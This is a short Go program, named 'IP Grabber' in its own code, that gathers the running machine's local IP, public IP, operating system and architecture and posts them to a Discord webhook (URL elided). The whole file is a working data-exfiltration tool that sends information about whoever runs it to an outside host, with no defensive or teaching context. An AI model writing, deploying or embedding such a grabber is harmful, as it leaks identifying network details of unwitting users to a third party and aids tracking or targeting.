package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"runtime"

	"github.com/gtuk/discordwebhook"
)

func GetLocalIP() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	localAddress := conn.LocalAddr().(*net.UDPAddr)

	return localAddress.IP
}

type IP struct {
	Query string
}

func GetPublicIP() string {
	req, err := http.Get("http://ip-api.com/json/")
	if err != nil {
		return err.Error()
	}
	defer req.Body.Close()

	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return err.Error()
	}

	var ip IP
	json.Unmarshal(body, &ip)

	return ip.Query
}

func main() {
	var username = "IP Grabber"
	localIP := GetLocalIP()
	publicIP := GetPublicIP()
	os := runtime.GOOS
	arch := runtime.GOARCH
	var content = fmt.Sprintf("Its local IP is : **%s**\nIts public IP is : **%s**\nIts operating system is : **%s**\nIts architecture is : **%s**", localIP, publicIP, os, arch)
	var url = "..."

	message := discordwebhook.Message{
		Username: &username,
		Content:  &content,
	}

	err := discordwebhook.SendMessage(url, message)
	if err != nil {
		log.Fatal(err)
	}
}
